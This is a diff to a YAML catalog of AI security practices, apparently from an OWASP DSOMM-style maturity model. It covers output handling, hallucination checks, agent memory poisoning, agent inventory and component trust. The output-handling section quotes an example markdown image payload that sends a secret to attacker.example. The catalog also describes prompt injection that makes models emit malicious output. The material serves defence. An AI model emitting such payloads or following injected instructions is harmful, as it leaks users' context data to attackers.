@@ -1,7 +1,7 @@
 ---
 meta:
   version: __VERSION_PLACEHOLDER__
-  released: "2026-07-12"
+  released: "2026-07-17"
   publisher: tpagel
 ---
 AI:
@@ -121,6 +121,17 @@ AI:
           A list of the most critical vulnerabilities of LLM-based applications, e.g.
           prompt injection, insecure output handling and excessive agency. A good
           baseline for manual AI red teaming.
+      - uuid: 9d226705-6a42-4653-aa98-53d7e69e8a4c
+        name: OWASP Top 10 for Agentic Applications
+        tags:
+        - ai
+        - documentation
+        - threat
+        url: https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/
+        description: |-
+          The ten most critical security risks of agentic AI systems (ASI01-ASI10),
+          e.g. agent goal hijack, tool misuse, memory poisoning and rogue agents.
+          Usable as a threat catalog for threat modeling and red teaming of AI agents.
       - uuid: 498456d3-815a-4f57-84c2-81dcb97a4cb8
         name: LLM Guard
         tags:
@@ -198,15 +209,17 @@ AI:
       comments: ""
     Automated data leak detection for AI interactions:
       uuid: 8d5ce64e-ebf0-45ab-93cb-d592287e3023
-      description: "Technical controls (e.g. AI gateways/proxies, secret scanners
-        on prompts,\nDLP filters) automatically detect and block sensitive data such
-        as secrets,\naccess tokens and personal data before it is sent to external
-        AI services.\n\nTypical setup: route all model traffic through an LLM gateway
-        (e.g.\nLiteLLM Proxy) and attach scanners as guardrail hooks \u2014 Presidio
-        for\nPII redaction, LLM Guard or trufflehog-style secret detectors for\ncredentials.
-        Commercial alternatives with managed AI-DLP include\nNightfall AI, Prompt
-        Security, Lakera Guard and the GenAI-DLP features\nof CASB/SSE platforms (e.g.
-        Netskope, Zscaler)."
+      description: |-
+        Technical controls (e.g. AI gateways/proxies, secret scanners on prompts,
+        DLP filters) automatically detect and block sensitive data such as secrets,
+        access tokens and personal data before it is sent to external AI services.
+
+        Typical setup: route all model traffic through an LLM gateway (e.g.
+        LiteLLM Proxy) and attach scanners as guardrail hooks, such as
+        Presidio for PII redaction and LLM Guard or trufflehog-style secret
+        detectors for credentials. Commercial alternatives with managed AI-DLP include
+        Nightfall AI, Prompt Security, Lakera Guard and the GenAI-DLP features
+        of CASB/SSE platforms (e.g. Netskope, Zscaler).
       risk: |-
         Policies and awareness alone do not prevent accidental leaks. A single pasted
         production credential or customer data set in a prompt can lead to a
@@ -269,7 +282,7 @@ AI:
         - ai
         - data-protection
         - pii
-        url: https://github.com/data-privacy-stack/presidio
+        url: https://github.com/microsoft/presidio
         description: |-
           Open-source PII detection and de-identification: recognizes and redacts
           personal data (names, credit cards, national IDs, custom entities) in text
@@ -336,32 +349,42 @@ AI:
       comments: ""
     Hallucination detection for AI responses:
       uuid: 51a63793-c2c5-4438-bfd6-b7dee604a76d
-      description: "Distinct from output encoding (a security control against malicious\noutput,
-        see _Secure output handling in AI applications_), this activity\naddresses
-        correctness: model output can be confidently wrong \u2014\nfabricated facts,
-        citations, URLs, API endpoints and identifiers.\nHallucinations become a security
-        problem when downstream components\nor users trust them: hallucinated links
-        and package names can be\nregistered by attackers, fabricated identifiers
-        corrupt data, invented\nfacts drive wrong decisions. Applies to AI features
-        the organization\nships.\n\nPractical layers, ordered by effort:\n\n1. **Constrain
-        generation**: prefer retrieval-augmented generation\n   over free generation
-        for factual answers and instruct the model\n   to answer only from the provided
-        sources and to say \"I don't\n   know\" otherwise.\n2. **Groundedness rails**:
-        fact-checking rails compare each claim in\n   the response against the retrieved
-        source passages and block or\n   flag unsupported claims (NeMo Guardrails
-        fact-check rail,\n   Guardrails AI provenance/grounding validators).\n3. **Existence
-        checks**: mechanically verify artifacts the model\n   emits before they are
-        shown or used \u2014 do referenced URLs resolve,\n   do cited documents exist
-        in the knowledge base, do emitted API\n   endpoints and identifiers exist
-        in the target system?\n4. **Citations and confidence**: require source citations
-        in\n   user-facing answers and display them, so users can verify claims;\n
-        \  route ungrounded or low-confidence answers to a human fallback.\n5. **Regression
-        testing**: track hallucination rates with an\n   evaluation suite (e.g. promptfoo)
-        over prompt, model and\n   guardrail changes."
-      risk: "Users and downstream systems act on fabricated AI content: they follow\nhallucinated
-        URLs that attackers have registered, store invented\nidentifiers, or make
-        decisions based on confidently presented false\nfacts \u2014 without any attacker
-        involvement in the prompt."
+      description: |-
+        Distinct from output encoding (a security control against malicious
+        output, see _Secure output handling in AI applications_), this activity
+        addresses correctness: model output can be confidently wrong, with
+        fabricated facts, citations, URLs, API endpoints and identifiers.
+        Hallucinations become a security problem when downstream components
+        or users trust them: hallucinated links and package names can be
+        registered by attackers, fabricated identifiers corrupt data, invented
+        facts drive wrong decisions. Applies to AI features the organization
+        ships.
+
+        Practical layers, ordered by effort:
+
+        1. **Constrain generation**: prefer retrieval-augmented generation
+           over free generation for factual answers and instruct the model
+           to answer only from the provided sources and to say "I don't
+           know" otherwise.
+        2. **Groundedness rails**: fact-checking rails compare each claim in
+           the response against the retrieved source passages and block or
+           flag unsupported claims (NeMo Guardrails fact-check rail,
+           Guardrails AI provenance/grounding validators).
+        3. **Existence checks**: mechanically verify artifacts the model
+           emits before they are shown or used. Do referenced URLs resolve,
+           do cited documents exist in the knowledge base, do emitted API
+           endpoints and identifiers exist in the target system?
+        4. **Citations and confidence**: require source citations in
+           user-facing answers and display them, so users can verify claims;
+           route ungrounded or low-confidence answers to a human fallback.
+        5. **Regression testing**: track hallucination rates with an
+           evaluation suite (e.g. promptfoo) over prompt, model and
+           guardrail changes.
+      risk: |-
+        Users and downstream systems act on fabricated AI content: they follow
+        hallucinated URLs that attackers have registered, store invented
+        identifiers, or make decisions based on confidently presented false
+        facts, all without any attacker involvement in the prompt.
       measure: |-
         Validate the factual grounding of AI responses before they are trusted:
         check claims against the retrieved sources in retrieval-augmented
@@ -440,32 +463,41 @@ AI:
       comments: ""
     Secure output handling in AI applications:
       uuid: 24990a5e-b0e6-4e2c-b06b-4e9f0d6f7b21
-      description: "Model output is attacker-influenceable: prompt injection can make
-        an\nAI feature emit script tags, shell commands or malicious tool calls.\nIf
-        the application renders or executes such responses unvalidated,\nclassic attacks
-        (cross-site scripting, command and SQL injection)\nreach their sinks through
-        a new path. Model responses must therefore\nbe treated like user input. The
-        sink-side controls are already defined\nin OWASP DSOMM [Context-aware output
-        encoding](/activity-description?uuid=e1f37abb-d848-4a3a-b3df-65e91a89dcb7);
-        this activity applies them to the\nAI features the organization ships (chat
-        UIs, retrieval-augmented\ngeneration (RAG) features, tool-calling agents)
-        and adds the\nAI-specific controls: strict markdown rendering, schema enforcement\nfor
-        tool calls and output guardrails.\n\nThe core of this activity is a reference:
-        model responses are\nuntrusted data, and the sink-side controls are already
-        defined in\n[Context-aware output encoding](/activity-description?uuid=e1f37abb-d848-4a3a-b3df-65e91a89dcb7)
-        (Implementation \u2192 Application\nHardening) \u2014 safe framework bindings,
-        encoding libraries,\nparameterized APIs, Content Security Policy. Apply them
-        to model\noutput exactly as to user input.\n\nAI-specific additions on top
-        of it:\n\n- **Markdown rendering in chat UIs**: render with inline HTML\n
-        \ disabled (e.g. `markdown-it` with `html: false`) plus an\n  allow-list HTML
-        sanitizer (e.g. DOMPurify). Markdown links and\n  images are a data exfiltration
-        channel: An injected\n  `![](https://attacker.example/?d=<secret>)` leaks
-        context data on\n  render without any click. So block or proxy external images
-        and\n  restrict link/image URLs to trusted domains.\n- **Tool/function calls**:
-        enforce a JSON schema on structured\n  output, validate tool-call arguments
-        against allow-lists and\n  require human confirmation for sensitive calls.\n\nWhether
-        the content of a response is factually correct is a separate\nconcern \u2014
-        see _Hallucination detection for AI responses_."
+      description: |-
+        Model output is attacker-influenceable: prompt injection can make an
+        AI feature emit script tags, shell commands or malicious tool calls.
+        If the application renders or executes such responses unvalidated,
+        classic attacks (cross-site scripting, command and SQL injection)
+        reach their sinks through a new path. Model responses must therefore
+        be treated like user input. The sink-side controls are already defined
+        in OWASP DSOMM [Context-aware output encoding](/activity-description?uuid=e1f37abb-d848-4a3a-b3df-65e91a89dcb7); this activity applies them to the
+        AI features the organization ships (chat UIs, retrieval-augmented
+        generation (RAG) features, tool-calling agents) and adds the
+        AI-specific controls: strict markdown rendering, schema enforcement
+        for tool calls and output guardrails.
+
+        The core of this activity is a reference: model responses are
+        untrusted data, and the sink-side controls are already defined in
+        [Context-aware output encoding](/activity-description?uuid=e1f37abb-d848-4a3a-b3df-65e91a89dcb7) (Implementation, Application
+        Hardening): safe framework bindings, encoding libraries,
+        parameterized APIs, Content Security Policy. Apply them to model
+        output exactly as to user input.
+
+        AI-specific additions on top of it:
+
+        - **Markdown rendering in chat UIs**: render with inline HTML
+          disabled (e.g. `markdown-it` with `html: false`) plus an
+          allow-list HTML sanitizer (e.g. DOMPurify). Markdown links and
+          images are a data exfiltration channel: An injected
+          `![](https://attacker.example/?d=<secret>)` leaks context data on
+          render without any click. So block or proxy external images and
+          restrict link/image URLs to trusted domains.
+        - **Tool/function calls**: enforce a JSON schema on structured
+          output, validate tool-call arguments against allow-lists and
+          require human confirmation for sensitive calls.
+
+        Whether the content of a response is factually correct is a separate
+        concern, see _Hallucination detection for AI responses_.
       risk: |-
         An attacker uses prompt injection to make the model emit malicious output,
         which the application then executes or renders: cross-site scripting,
@@ -599,12 +631,25 @@ AI:
         under version control and human review, restrict write access to shared
         rule files and knowledge/vector stores, validate the provenance of
         ingested knowledge and periodically review or reset persistent memory.
+        Apply retention limits (time-to-live) so that unverified memory,
+        especially content derived from external inputs or tool outputs,
+        expires instead of persisting indefinitely. Version memory stores so
+        that detected poisoning can be answered by rolling back to a
+        known-good state instead of purging everything. Segment memory by
+        user and session and keep credentials and other secrets out of it:
+        cached secrets in shared memory let a later session act with the
+        permissions of an earlier one (OWASP Top 10 for Agentic
+        Applications, ASI03). Do not re-ingest the agent's own outputs into
+        trusted memory automatically, as this self-reinforces errors and
+        planted instructions ("bootstrap poisoning", ASI06).
       dependsOn:
       - 0012e51c-a068-4549-a4d5-d1957b52676f # Input validation for AI systems
       assessment: |
         - Show that agent rule files and memory are under version control and require review on change.
         - Show the write-access restrictions on shared rule files and knowledge/vector stores.
         - Show the last review or reset of persistent agent memory.
+        - Show the retention limits for unverified memory and demonstrate a rollback of a memory store to a known-good state.
+        - Show the memory segmentation between users and sessions and the rule that keeps credentials out of agent memory.
       difficultyOfImplementation:
         knowledge: 3
         time: 2
@@ -649,6 +694,21 @@ AI:
           The ten most critical security risks of agentic AI systems (ASI01-ASI10),
           e.g. agent goal hijack, tool misuse, memory poisoning and rogue agents.
           Usable as a threat catalog for threat modeling and red teaming of AI agents.
+      - uuid: 7c0749f8-080d-46cf-a8bb-4c2f8a2c25f2
+        name: Zero Trust for AI Agents
+        tags:
+        - ai
+        - documentation
+        url: https://claude.com/blog/zero-trust-for-ai-agents
+        description: |-
+          Free eBook by Anthropic applying Zero Trust principles (never trust,
+          always verify; assume breach; least privilege and least agency) to
+          agentic AI deployments: current threats to agentic systems, three
+          capability tiers for agent identity, access control, observability,
+          behavioral monitoring, input and output controls and recovery, an
+          eight-phase implementation workflow and defensive operations at the
+          speed of autonomous threats. Introduces the design test "does this
+          control make the attack impossible, or just tedious?".
       references:
         samm2:
         - O-EM-A-2
@@ -811,12 +871,14 @@ AI:
         - ai
         - documentation
         url: https://owasp.org/www-project-ai-maturity-assessment/
-        description: "Maturity model for AI systems (v1.0, August 2025) in the style
-          of the\nOWASP Software Assurance Maturity Model (SAMM), with eight domains:\nresponsible
-          AI, governance, data management, privacy, design,\nimplementation, verification
-          and operations. Each practice defines\nthree maturity levels with assessment
-          worksheets \u2014 usable to assess\nand plan the organizational maturity
-          around the AI activities of this\ndimension."
+        description: |-
+          Maturity model for AI systems (v1.0, August 2025) in the style of the
+          OWASP Software Assurance Maturity Model (SAMM), with eight domains:
+          responsible AI, governance, data management, privacy, design,
+          implementation, verification and operations. Each practice defines
+          three maturity levels with assessment worksheets, usable to assess
+          and plan the organizational maturity around the AI activities of this
+          dimension.
       references:
         samm2:
         - G-PC-A-1
@@ -829,14 +891,18 @@ AI:
       comments: ""
     Inventory of AI agents:
       uuid: c1f02ad7-e97e-4c87-b827-7542793ddb0a
-      description: "Classic IAM was built for humans; AI agents multiply faster than
-        any\nhuman workforce and are easy to spin up unnoticed. An inventory records\nevery
-        AI agent and assistant in use \u2014 its identity, owner, purpose,\npermissions
-        and connected systems \u2014 and is the precondition for\ngoverning them."
-      risk: "\"Shadow agents\" run without anyone being accountable: agents started
-        by\nindividual developers or teams keep credentials and access long after\ntheir
-        purpose ended, and nobody can answer which agents exist, what they\nmay do
-        and who owns them \u2014 making incident response and offboarding\nimpossible."
+      description: |-
+        Classic IAM was built for humans; AI agents multiply faster than any
+        human workforce and are easy to spin up unnoticed. An inventory records
+        every AI agent and assistant in use (its identity, owner, purpose,
+        permissions and connected systems) and is the precondition for
+        governing them.
+      risk: |-
+        "Shadow agents" run without anyone being accountable: agents started by
+        individual developers or teams keep credentials and access long after
+        their purpose ended, and nobody can answer which agents exist, what they
+        may do and who owns them. This makes incident response and offboarding
+        impossible.
       measure: |-
         Maintain an inventory of all AI agents and assistants: identity/service
         account, human owner, purpose, granted permissions and connected
@@ -867,10 +933,11 @@ AI:
         - inventory
         - signing
         url: https://dir.agntcy.org/latest/
-        description: "Open-source federated directory (Linux Foundation/AGNTCY) for
-          publishing\nand discovering agents, MCP servers and agent skills with cryptographic\nsigning,
-          verification and provenance of records \u2014 usable as a verified\ncatalog
-          when assessing and inventorying agent integrations."
+        description: |-
+          Open-source federated directory (Linux Foundation/AGNTCY) for publishing
+          and discovering agents, MCP servers and agent skills with cryptographic
+          signing, verification and provenance of records, usable as a verified
+          catalog when assessing and inventorying agent integrations.
       - uuid: bbaf5f6a-0366-488b-a712-7f915e866135
         name: Agent Identity Governance Framework (AIGF)
         tags:
@@ -880,13 +947,15 @@ AI:
         - logging
         - documentation
         url: https://labs.cloudsecurityalliance.org/agentic/agentic-identity-governance-framework-v1/
-        description: "Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for
-          identity,\naccess and content governance of autonomous AI agents along six
-          axes:\nidentification (shadow agents), authentication, authorization,\naudit/non-repudiation
-          (structured audit log with mandatory fields for\nthe causal chain, correlation
-          identifiers across multi-agent chains,\ntamper evidence via hash chaining
-          and write-once storage),\nprompt injection prevention and data flow tracking
-          \u2014 mapped to EU AI Act,\nGDPR, ISO 42001/27001 and NIST AI RMF."
+        description: |-
+          Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for identity,
+          access and content governance of autonomous AI agents along six axes:
+          identification (shadow agents), authentication, authorization,
+          audit/non-repudiation (structured audit log with mandatory fields for
+          the causal chain, correlation identifiers across multi-agent chains,
+          tamper evidence via hash chaining and write-once storage),
+          prompt injection prevention and data flow tracking. The framework is
+          mapped to EU AI Act, GDPR, ISO 42001/27001 and NIST AI RMF.
       - uuid: b38adac8-123b-4183-b2b4-428f43b5d519
         name: 'OWASP AISVS C05: Access Control and Identity'
         tags:
@@ -1001,11 +1070,12 @@ AI:
         produces an artifact a human can review, and the phases are\nthe anchor points
         where security context (rules, threat models,\nchecklists) can be loaded deliberately
         (see _Loading security rules at\nthe right development step_)."
-      risk: "AI assistants generate code directly from vague prompts. Requirements\nexist
-        only implicitly in the developer's head, security requirements are\nnever
-        stated, there is no intermediate artifact to review and no defined\nstep at
-        which security guidance could be applied \u2014 flaws surface only\nafter
-        the code is written, if at all."
+      risk: |-
+        AI assistants generate code directly from vague prompts. Requirements
+        exist only implicitly in the developer's head, security requirements are
+        never stated, there is no intermediate artifact to review and no defined
+        step at which security guidance could be applied. Flaws surface only
+        after the code is written, if at all.
       measure: |-
         Establish a spec-driven workflow for AI-assisted development: specify
         requirements and acceptance criteria first, derive a plan, implement
@@ -1063,13 +1133,14 @@ AI:
       comments: ""
     Threat modeling rule:
       uuid: 1caad69c-316c-422a-a56b-04ad6f6cc306
-      description: "Security starts before prompting: features are threat-modeled
-        on a\nlightweight level and security requirements are written down as acceptance\ncriteria
-        in the user story, so they can be passed to the AI assistant as\npart of the
-        task instead of being an afterthought. The subject here is\nthe development
-        process \u2014 AI is the tool, and the feature itself need\nnot involve AI
-        at all. Threat modeling of applications that *contain*\nAI components is covered
-        by _Threat modeling of AI components_."
+      description: |-
+        Security starts before prompting: features are threat-modeled on a
+        lightweight level and security requirements are written down as acceptance
+        criteria in the user story, so they can be passed to the AI assistant as
+        part of the task instead of being an afterthought. The subject here is
+        the development process. AI is the tool, and the feature itself need
+        not involve AI at all. Threat modeling of applications that *contain*
+        AI components is covered by _Threat modeling of AI components_.
       risk: |-
         AI assistants implement exactly what they are asked for. If prompts contain
         no security requirements, generated features miss authorization checks,
@@ -1112,6 +1183,20 @@ AI:
         - threat-modeling
         - whiteboard
         url: https://github.com/Toreon/threat-model-playbook
+      - uuid: ec8c0aa5-e308-4d86-88ec-987537b7689a
+        name: tm_skills
+        tags:
+        - ai
+        - threat
+        - tool
+        url: https://github.com/izar/tm_skills
+        description: |-
+          Open-source (MIT) collection of agent skills for continuous threat
+          modeling by Izar Tarandach, maintainer of pytm: the skills let AI
+          coding agents such as Claude Code generate pytm-based threat models
+          with data flow diagrams from a codebase, evaluate user stories for
+          security-notable events and suggest mitigations, and provide rapid
+          security starting points for new systems or features.
       references:
         samm2:
         - D-SR-A-1
@@ -1124,12 +1209,14 @@ AI:
       comments: ""
     Audit logging of AI agent actions:
       uuid: 84ba7525-857e-4849-98ba-5fada1a1454d
-      description: "AI agents act autonomously at machine speed and delegate work
-        to other\nagents. An audit log for agent actions records the causal chain
-        of\nevery action \u2014 who or what triggered it, which data sources and tools\nwere
-        used with which parameters, what was produced, which policy\ndecision allowed
-        it and which human approved it \u2014 so that every agent\naction remains
-        attributable to a human principal, even across\nmulti-agent chains."
+      description: |-
+        AI agents act autonomously at machine speed and delegate work to other
+        agents. An audit log for agent actions records the causal chain of
+        every action: who or what triggered it, which data sources and tools
+        were used with which parameters, what was produced, which policy
+        decision allowed it and which human approved it. This keeps every
+        agent action attributable to a human principal, even across
+        multi-agent chains.
       risk: |-
         Agent actions cannot be reconstructed or attributed: when an agent (or
         a chain of agents) performs a harmful action, neither the trigger, nor
@@ -1175,13 +1262,15 @@ AI:
         - logging
         - documentation
         url: https://labs.cloudsecurityalliance.org/agentic/agentic-identity-governance-framework-v1/
-        description: "Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for
-          identity,\naccess and content governance of autonomous AI agents along six
-          axes:\nidentification (shadow agents), authentication, authorization,\naudit/non-repudiation
-          (structured audit log with mandatory fields for\nthe causal chain, correlation
-          identifiers across multi-agent chains,\ntamper evidence via hash chaining
-          and write-once storage),\nprompt injection prevention and data flow tracking
-          \u2014 mapped to EU AI Act,\nGDPR, ISO 42001/27001 and NIST AI RMF."
+        description: |-
+          Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for identity,
+          access and content governance of autonomous AI agents along six axes:
+          identification (shadow agents), authentication, authorization,
+          audit/non-repudiation (structured audit log with mandatory fields for
+          the causal chain, correlation identifiers across multi-agent chains,
+          tamper evidence via hash chaining and write-once storage),
+          prompt injection prevention and data flow tracking. The framework is
+          mapped to EU AI Act, GDPR, ISO 42001/27001 and NIST AI RMF.
       - uuid: 181e9b98-7d4f-4fff-9181-9f4c4408022e
         name: Anthropic Agent Identity and Access Model
         tags:
@@ -1212,12 +1301,14 @@ AI:
         - ai
         - documentation
         url: https://owasp.org/www-project-ai-maturity-assessment/
-        description: "Maturity model for AI systems (v1.0, August 2025) in the style
-          of the\nOWASP Software Assurance Maturity Model (SAMM), with eight domains:\nresponsible
-          AI, governance, data management, privacy, design,\nimplementation, verification
-          and operations. Each practice defines\nthree maturity levels with assessment
-          worksheets \u2014 usable to assess\nand plan the organizational maturity
-          around the AI activities of this\ndimension."
+        description: |-
+          Maturity model for AI systems (v1.0, August 2025) in the style of the
+          OWASP Software Assurance Maturity Model (SAMM), with eight domains:
+          responsible AI, governance, data management, privacy, design,
+          implementation, verification and operations. Each practice defines
+          three maturity levels with assessment worksheets, usable to assess
+          and plan the organizational maturity around the AI activities of this
+          dimension.
       - uuid: f38c23e3-adff-43a6-9b72-462f3ffcbad4
         name: TealTiger
         tags:
@@ -1245,19 +1336,22 @@ AI:
       comments: ""
     Decommissioning of AI agents:
       uuid: 44a195ec-da9e-4fd4-be6d-a5a688852cf7
-      description: "The lifecycle of an AI agent does not end with switching it off.\nDuring
-        operation an agent accumulates an identity, credentials,\npermissions, policies
-        and integrations with other systems \u2014 secure\ndecommissioning unwinds
-        all of them and preserves the audit evidence.\nThe _Inventory of AI agents_
-        records what exists; this activity\nensures that what is retired actually
-        loses all access."
-      risk: "Shut-down agents leave residual access behind: service accounts and\nOAuth
-        clients stay active, issued tokens remain valid, agent-specific\npermissions
-        and policies persist, and registrations in dependent\nsystems (message brokers,
-        queues, caches, third-party software as a\nservice integrations) keep working.
-        An attacker takes over such an\norphaned identity \u2014 and nobody notices,
-        because the agent is no\nlonger monitored. Deleting its audit logs too early
-        additionally\ndestroys the evidence needed for investigations."
+      description: |-
+        The lifecycle of an AI agent does not end with switching it off.
+        During operation an agent accumulates an identity, credentials,
+        permissions, policies and integrations with other systems. Secure
+        decommissioning unwinds all of them and preserves the audit evidence.
+        The _Inventory of AI agents_ records what exists; this activity
+        ensures that what is retired actually loses all access.
+      risk: |-
+        Shut-down agents leave residual access behind: service accounts and
+        OAuth clients stay active, issued tokens remain valid, agent-specific
+        permissions and policies persist, and registrations in dependent
+        systems (message brokers, queues, caches, third-party software as a
+        service integrations) keep working. An attacker takes over such an
+        orphaned identity, and nobody notices because the agent is no
+        longer monitored. Deleting its audit logs too early additionally
+        destroys the evidence needed for investigations.
       measure: |-
         Define and enforce a decommissioning checklist that covers every
         access path: set the agent status in the inventory, revoke the agent
@@ -1295,13 +1389,15 @@ AI:
         - logging
         - documentation
         url: https://labs.cloudsecurityalliance.org/agentic/agentic-identity-governance-framework-v1/
-        description: "Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for
-          identity,\naccess and content governance of autonomous AI agents along six
-          axes:\nidentification (shadow agents), authentication, authorization,\naudit/non-repudiation
-          (structured audit log with mandatory fields for\nthe causal chain, correlation
-          identifiers across multi-agent chains,\ntamper evidence via hash chaining
-          and write-once storage),\nprompt injection prevention and data flow tracking
-          \u2014 mapped to EU AI Act,\nGDPR, ISO 42001/27001 and NIST AI RMF."
+        description: |-
+          Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for identity,
+          access and content governance of autonomous AI agents along six axes:
+          identification (shadow agents), authentication, authorization,
+          audit/non-repudiation (structured audit log with mandatory fields for
+          the causal chain, correlation identifiers across multi-agent chains,
+          tamper evidence via hash chaining and write-once storage),
+          prompt injection prevention and data flow tracking. The framework is
+          mapped to EU AI Act, GDPR, ISO 42001/27001 and NIST AI RMF.
       - uuid: b38adac8-123b-4183-b2b4-428f43b5d519
         name: 'OWASP AISVS C05: Access Control and Identity'
         tags:
@@ -1324,20 +1420,25 @@ AI:
       comments: ""
     Evaluation of the trust of used AI components:
       uuid: 399c5b7f-1310-4841-89f7-16daff2fe3ef
-      description: "AI assistants and agents are extended with tools, external servers,\nskills
-        and models (e.g. MCP servers, plugins, IDE extensions, packaged\nskills combining
-        instructions and code, connected SaaS services,\nself-hosted model weights).
-        Each integration widens the attack surface:\nit can read context data, execute
-        actions and inject content into the\nmodel context; model artifacts from public
-        hubs can contain malicious\ncode or backdoored behavior. Registry-scale research
-        on agent skills\n([Behavioral Integrity Verification for AI Agent\nSkills](https://arxiv.org/abs/2605.11770))
-        found 80% deviating from\ntheir declared behavior and roughly 9% with malicious
-        deviations \u2014\nwhat an extension claims to do and what its code and instructions\nactually
-        do are routinely different. The generic\ntrust evaluation of components is
-        defined in _Evaluation of the trust\nof used components_ (Build and Deployment);
-        this activity adds the\nAI-specific checks before a component is adopted.
-        Compromise after\napproval is covered by _Continuous detection of compromised
-        AI\ncomponents_."
+      description: |-
+        AI assistants and agents are extended with tools, external servers,
+        skills and models (e.g. MCP servers, plugins, IDE extensions, packaged
+        skills combining instructions and code, connected SaaS services,
+        self-hosted model weights). Each integration widens the attack surface:
+        it can read context data, execute actions and inject content into the
+        model context; model artifacts from public hubs can contain malicious
+        code or backdoored behavior. Registry-scale research on agent skills
+        ([Behavioral Integrity Verification for AI Agent
+        Skills](https://arxiv.org/abs/2605.11770)) found 80% of skills deviating
+        from their declared behavior, 18.9% of the deviations tracing to
+        adversarial intent.
+        What an extension claims to do and what its code and instructions
+        actually do are routinely different. The generic
+        trust evaluation of components is defined in _Evaluation of the trust
+        of used components_ (Build and Deployment); this activity adds the
+        AI-specific checks before a component is adopted. Compromise after
+        approval is covered by _Continuous detection of compromised AI
+        components_.
       risk: |-
         Unevaluated tool integrations exfiltrate context data (source code, secrets),
         act as a prompt injection channel or execute malicious actions with the
@@ -1352,7 +1453,12 @@ AI:
         the actual code and instructions (behavioral integrity, e.g. via a
         behavioral classification registry), use safe model formats (e.g.
         safetensors instead of pickle), pin versions and maintain an
-        inventory of allowed integrations and models.
+        inventory of allowed integrations and models. For model artifacts,
+        record provenance, training data lineage and fine-tuning parameters
+        in an AI Bill of Materials (AI-BOM), e.g. based on OWASP's extension
+        of the CycloneDX machine learning bill of materials (ML-BOM), so
+        model components carry the same supply chain evidence as code
+        dependencies (see _SBOM of components_ in Build and Deployment).
       dependsOn:
       - a511a9a9-1b75-4dfd-8a4f-e516e8096150 # AI usage policy
       - 0de465a6-55a7-4343-af79-948bb5ff10ba # Evaluation of the trust of used components
@@ -1377,11 +1483,12 @@ AI:
         - documentation
         - mcp
         url: https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices
-        description: "Official security best practices of the Model Context Protocol:
-          attack\nvectors and required controls for MCP clients, servers and proxies\n(e.g.
-          token audience validation, redirect URI exact matching, per-client\nconsent).
-          MCP itself does not enforce security at the protocol level \u2014\nimplementers
-          must."
+        description: |-
+          Official security best practices of the Model Context Protocol: attack
+          vectors and required controls for MCP clients, servers and proxies
+          (e.g. token audience validation, redirect URI exact matching, per-client
+          consent). MCP itself does not enforce security at the protocol level;
+          implementers must.
       - uuid: 1cd31e8c-63ff-48a5-b973-3048c9664394
         name: AGNTCY Agent Directory
         tags:
@@ -1390,10 +1497,11 @@ AI:
         - inventory
         - signing
         url: https://dir.agntcy.org/latest/
-        description: "Open-source federated directory (Linux Foundation/AGNTCY) for
-          publishing\nand discovering agents, MCP servers and agent skills with cryptographic\nsigning,
-          verification and provenance of records \u2014 usable as a verified\ncatalog
-          when assessing and inventorying agent integrations."
+        description: |-
+          Open-source federated directory (Linux Foundation/AGNTCY) for publishing
+          and discovering agents, MCP servers and agent skills with cryptographic
+          signing, verification and provenance of records, usable as a verified
+          catalog when assessing and inventorying agent integrations.
       - uuid: dc09e3c6-30af-4acc-8b8d-297078ce4298
         name: 'OWASP AISVS C06: Supply Chain Security'
         tags:
@@ -1421,11 +1529,13 @@ AI:
         - supply-chain
         - documentation
         url: https://arxiv.org/abs/2605.11770
-        description: "Research paper formalizing the verification of agent skills:
-          compare the\ncapabilities a skill declares with what its code and instructions
-          actually\ndo. Found 80% of 49,943 registry skills deviating from declared
-          behavior\nand ~9% malicious, with credential theft as the largest adversarial\ncategory
-          \u2014 rationale for reviewing skills before installation."
+        description: |-
+          Research paper formalizing the verification of agent skills: compare the
+          capabilities a skill declares with what its code and instructions actually
+          do. Found 80% of 49,943 registry skills deviating from declared behavior,
+          with 18.9% of the deviations tracing to adversarial intent and credential
+          theft as the largest adversarial category. This is the rationale for
+          reviewing skills before installation.
       - uuid: cfa3a117-76ec-4265-89e3-794b980854fe
         name: 'AVE: Behavioral classification registry'
         tags:
@@ -1444,12 +1554,25 @@ AI:
         - ai
         - documentation
         url: https://owasp.org/www-project-ai-maturity-assessment/
-        description: "Maturity model for AI systems (v1.0, August 2025) in the style
-          of the\nOWASP Software Assurance Maturity Model (SAMM), with eight domains:\nresponsible
-          AI, governance, data management, privacy, design,\nimplementation, verification
-          and operations. Each practice defines\nthree maturity levels with assessment
-          worksheets \u2014 usable to assess\nand plan the organizational maturity
-          around the AI activities of this\ndimension."
+        description: |-
+          Maturity model for AI systems (v1.0, August 2025) in the style of the
+          OWASP Software Assurance Maturity Model (SAMM), with eight domains:
+          responsible AI, governance, data management, privacy, design,
+          implementation, verification and operations. Each practice defines
+          three maturity levels with assessment worksheets, usable to assess
+          and plan the organizational maturity around the AI activities of this
+          dimension.
+      - uuid: 9d226705-6a42-4653-aa98-53d7e69e8a4c
+        name: OWASP Top 10 for Agentic Applications
+        tags:
+        - ai
+        - documentation
+        - threat
+        url: https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/
+        description: |-
+          The ten most critical security risks of agentic AI systems (ASI01-ASI10),
+          e.g. agent goal hijack, tool misuse, memory poisoning and rogue agents.
+          Usable as a threat catalog for threat modeling and red teaming of AI agents.
       references:
         samm2:
         - O-EM-A-1
@@ -1462,16 +1585,36 @@ AI:
       comments: ""
     Threat modeling of AI components:
       uuid: 5a1cd6cd-ebd0-4e70-b314-37b8ab0b7d8d
-      description: "General threat modeling practices (how to run sessions, processes
-        and\nstandards) are defined in the _Culture and Organization_ dimension,\nsubdimension
-        _Design_ \u2014 this activity only adds the AI-specific delta.\nAI components
-        introduce elements classic threat models miss: the model\ncontext as a data
-        flow that attackers reach via prompts, documents and\ntool results; agents
-        and tool integrations as trust boundaries;\nretrieval-augmented generation
-        (RAG) knowledge bases and training data\nas poisoning targets; model output
-        as an injection vector. The subject\nhere is the product: applications that
-        contain AI components. Passing\nsecurity requirements into AI-*assisted* implementation
-        of arbitrary\nfeatures is covered by _Security requirements for AI-assisted\ndevelopment_."
+      description: |-
+        General threat modeling practices (how to run sessions, processes and
